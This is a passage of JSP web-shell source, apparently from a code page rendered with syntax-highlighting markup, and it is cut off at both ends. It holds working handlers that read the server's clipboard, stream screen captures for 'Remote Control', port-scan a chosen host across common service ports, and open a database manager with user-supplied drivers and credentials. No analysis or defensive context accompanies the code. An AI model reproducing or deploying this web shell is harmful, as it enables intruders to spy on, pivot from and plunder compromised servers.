class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;h2&gt;System Clipboard &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;pre&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">out.println(Util.htmlEncode(Util.getStr(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor))));</span></span><br><span class="line"><span class="vbscript">&#125;catch (Exception ex) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"ClipBoard is Empty Or Is Not Text Data !"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/pre&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input class=\"</span>bt\<span class="string">" name=\"</span>button\<span class="string">" id=\"</span>button\<span class="string">" onClick=\"</span>history.back()\<span class="string">" value=\"</span>Back\<span class="string">" type=\"</span>button\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VRemoteControlInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;script type=\"</span>text/javascript\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	var interval = null;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function a(btn) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		if (btn.value == \"</span><span class="keyword">Stop</span>\<span class="string">")"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			sstopClick(btn);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125; else &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			startClick(btn);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function startClick(btn)&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		btn.value = \"</span><span class="keyword">Stop</span>\<span class="string">";"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var pl = document.getElementById(\"</span>pl\<span class="string">").value;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		interval = setInterval(function()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var img = document.getElementById(\"</span>screen\<span class="string">");"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			img.src = \""+SHELL_NAME+"</span>?o=gc&amp;<span class="built_in">rnd</span>=\<span class="string">"+Math.random();"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,parseInt(pl)*1000);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function sstopClick(btn) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		clearInterval(interval);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		btn.value = \"</span>Start\<span class="string">";"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;h2&gt;Remote Control &amp;raquo;&lt;/h2&gt;&lt;input class=\"</span>bt\<span class="string">" onclick=\"</span>var img = document.getElementById(<span class="comment">'screen').src='"+SHELL_NAME+"?o=gc&amp;rnd='+Math.random();\" name=\"getsc\" id=\"getsc\" value=\"Get Screen\" type=\"button\" size=\"100\"  /&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input class=\"</span>bt\<span class="string">" name=\"</span>button\<span class="string">" id=\"</span>button\<span class="string">" onClick=\"</span>a(this)\<span class="string">" value=\"</span>Start\<span class="string">" type=\"</span>button\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt; Speed(Second , dont be so fast)  &lt;input type='text' value='3' size='5' id='pl' name='pl'/&gt;  Can Not Control Yet."</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;hr/&gt;&lt;p&gt;&lt;img id='screen' src='x'/&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//GetScreen</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> GcInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">Dimension size = Toolkit.getDefaultToolkit().getScreenSize();</span></span><br><span class="line"><span class="vbscript">Rectangle rec = <span class="keyword">new</span> Rectangle(<span class="number">0</span>,<span class="number">0</span>,(<span class="built_in">int</span>)size.getWidth(),(<span class="built_in">int</span>)size.getHeight());</span></span><br><span class="line"><span class="vbscript">BufferedImage img = <span class="keyword">new</span> Robot().createScreenCapture(rec);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.setContentType(<span class="string">"image/jpeg"</span>);</span></span><br><span class="line"><span class="vbscript">ImageIO.write(img,<span class="string">"jpg"</span>,<span class="built_in">response</span>.getOutputStream());</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VPortScanInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ip = <span class="built_in">request</span>.getParameter(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ports = <span class="built_in">request</span>.getParameter(<span class="string">"ports"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> timeout = <span class="built_in">request</span>.getParameter(<span class="string">"timeout"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ip))</span></span><br><span class="line"><span class="vbscript">ip = <span class="string">"127.0.0.1"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ports))</span></span><br><span class="line"><span class="vbscript">ports = <span class="string">"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(timeout)) </span></span><br><span class="line"><span class="vbscript">timeout = <span class="string">"2"</span>;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2 id=\"</span>Bin_H2_Title\<span class="string">"&gt;PortScan &amp;gt;&amp;gt;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;div id=\"</span>YwLB\<span class="string">"&gt;&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input type=\"</span>hidden\<span class="string">" value=\"</span>portScan\<span class="string">" name=\"</span>o\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"IP : &lt;input name=\"</span>ip\<span class="string">" type=\"</span>text\<span class="string">" value=\""+ip+"</span>\<span class="string">" id=\"</span>ip\<span class="string">" class=\"</span>input\<span class="string">" style=\"</span>width:<span class="number">10</span>%;margin:<span class="number">0</span> <span class="number">8</span>px;\<span class="string">" /&gt; Port : &lt;input name=\"</span>ports\<span class="string">" type=\"</span>text\<span class="string">" value=\""+ports+"</span>\<span class="string">" id=\"</span>ports\<span class="string">" class=\"</span>input\<span class="string">" style=\"</span>width:<span class="number">40</span>%;margin:<span class="number">0</span> <span class="number">8</span>px;\<span class="string">" /&gt; Timeout （秒） : &lt;input name=\"</span>timeout\<span class="string">" type=\"</span>text\<span class="string">" value=\""+timeout+"</span>\<span class="string">" id=\"</span>timeout\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">5</span>\<span class="string">" style=\"</span>margin:<span class="number">0</span> <span class="number">8</span>px;\<span class="string">" /&gt; &lt;input type=\"</span>submit\<span class="string">" name=\"</span>submit\<span class="string">" value=\"</span>Scan\<span class="string">" id=\"</span>submit\<span class="string">" class=\"</span>bt\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;&lt;/div&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> PortScanInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vPortScan"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ip = <span class="built_in">request</span>.getParameter(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ports = <span class="built_in">request</span>.getParameter(<span class="string">"ports"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> timeout = <span class="built_in">request</span>.getParameter(<span class="string">"timeout"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> iTimeout = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ip) || Util.<span class="built_in">isEmpty</span>(ports))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.isInteger(timeout)) &#123;</span></span><br><span class="line"><span class="vbscript">timeout = <span class="string">"2"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">iTimeout = Integer.parseInt(timeout);</span></span><br><span class="line"><span class="vbscript">Map&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt; rs = <span class="keyword">new</span> LinkedHashMap&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt;();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span>[] portArr = ports.<span class="built_in">split</span>(<span class="string">","</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">String</span> port:portArr) &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">Socket s = <span class="keyword">new</span> Socket();</span></span><br><span class="line"><span class="vbscript">s.connect(<span class="keyword">new</span> InetSocketAddress(ip,Integer.parseInt(port)),iTimeout);</span></span><br><span class="line"><span class="vbscript">s.close();</span></span><br><span class="line"><span class="vbscript">rs.put(port,<span class="string">"Open"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">rs.put(port,<span class="string">"Close"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='margin:10px'&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">Set</span>&lt;Map.Entry&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt;&gt; entrySet = rs.entrySet();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (Map.Entry&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt; e:entrySet) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> port = e.getKey();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> value = e.getValue();</span></span><br><span class="line"><span class="vbscript">out.println(ip+<span class="string">" : "</span>+port+<span class="string">" ................................. &lt;font color="</span>+(value.equals(<span class="string">"Open"</span>)?<span class="string">"green"</span>:<span class="string">"red"</span>)+<span class="string">"&gt;&lt;b&gt;"</span>+value+<span class="string">"&lt;/b&gt;&lt;/font&gt;&lt;br&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VConnInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">Object obj = JSession.getAttribute(DBO);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj == <span class="literal">null</span> || !((DBOperator)obj).isValid()) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"  &lt;script type=\"</span>text/javascript\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function changeurldriver()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var form = document.forms[\"</span>form1\<span class="string">"];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var v = form.elements[\"</span>db\<span class="string">"].value;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>url\<span class="string">"].value = v.split(\"</span>`\<span class="string">")[1];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>driver\<span class="string">"].value = v.split(\"</span>`\<span class="string">")[0];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>selectDb\<span class="string">"].value = form.elements[\"</span>db\<span class="string">"].selectedIndex;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" id=\"</span>selectDb\<span class="string">" name=\"</span>selectDb\<span class="string">" value=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;DataBase Manager &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input id=\"</span>action\<span class="string">" type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>dbc\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Driver:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input class=\"</span>input\<span class="string">" name=\"</span>driver\<span class="string">" id=\"</span>driver\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">35</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"URL:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>url\<span class="string">" id=\"</span>url\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">90</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"UID:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>uid\<span class="string">" id=\"</span>uid\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">10</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"PWD:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span>pwd\<span class="string">" id=\"</span>pwd\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">10</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"DataBase:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;select onchange='changeurldriver()' class=\"</span>input\<span class="string">" id=\"</span>db\<span class="string">" name=\"</span>db\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&amp;characterEncoding=GBK'&gt;Mysql&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='oracle.jdbc.driver.OracleDriver`jdbc:oracle:thin:@dbhost:1521:ORA1'&gt;Oracle&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'&gt;Sql Server&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver=&#123;Microsoft Access Driver (*.mdb)&#125;;DBQ=C:\\ninty.mdb'&gt;Access&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;option value=' ` '&gt;Other&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" &lt;/select&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>connect\<span class="string">" id=\"</span>connect\<span class="string">" value=\"</span>Connect\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;&lt;/table&gt;&lt;script&gt;changeurldriver()&lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"dbc"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//DBConnect</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DbcInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> driver = <span class="built_in">request</span>.getParameter(<span class="string">"driver"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> url = <span class="built_in">request</span>.getParameter(<span class="string">"url"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> uid = <span class="built_in">request</span>.getParameter(<span class="string">"uid"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> pwd = <span class="built_in">request</span>.getParameter(<span class="string">"pwd"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> sql = <span class="built_in">request</span>.getParameter(<span class="string">"sql"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> selectDb = <span class="built_in">request</span>.getParameter(<span class="string">"selectDb"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (selectDb == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">selectDb = JSession.getAttribute(<span class="string">"selectDb"</span>).toString();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">else</span></span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(<span class="string">"selectDb"</span>,selectDb);</span></span><br><span class="line"><span class="vbscript">Object dbo = JSession.getAttribute(DBO);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (dbo == <span class="literal">null</span> || !((DBOperator)dbo).isValid()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (dbo != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">((DBOperator)dbo).close();</span></span><br><span class="line"><span class="vbscript">dbo = <span class="keyword">new</span> DBOperator(driver,url,uid,pwd,<span class="literal">true</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(driver) &amp;&amp; !Util.<span class="built_in">isEmpty</span>(url) &amp;&amp; !Util.<span class="built_in">isEmpty</span>(uid)) &#123;</span></span><br><span class="line"><span class="vbscript">DBOperator oldDbo = (DBOperator)dbo;</span></span><br><span class="line"><span class="vbscript">dbo = <span class="keyword">new</span> DBOperator(driver,url,uid,pwd);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!oldDbo.equals(dbo)) &#123;</span></span><br><span class="line"><span class="vbscript">((DBOperator)oldDbo).close();</span></span><br><span class="line"><span class="vbscript">((DBOperator)dbo).connect();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">dbo = oldDbo;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; </span></span><br><span class="line"><span class="vbscript">DBOperator Ddbo = (DBOperator)dbo;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(DBO,Ddbo);</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,<span class="string">"Connect To DataBase Success!"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"  &lt;script type=\"</span>text/javascript\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function changeurldriver(selectDb)&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var form = document.forms[\"</span>form1\<span class="string">"];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		if (selectDb)&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			form.elements[\"</span>db\<span class="string">"].selectedIndex = selectDb"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var v = form.elements[\"</span>db\<span class="string">"].value;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>url\<span class="string">"].value = v.split(\"</span>`\<span class="string">")[1];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>driver\<span class="string">"].value = v.split(\"</span>`\<span class="string">")[0];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.elements[\"</span>selectDb\<span class="string">"].value = form.elements[\"</span>db\<span class="string">"].selectedIndex;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" 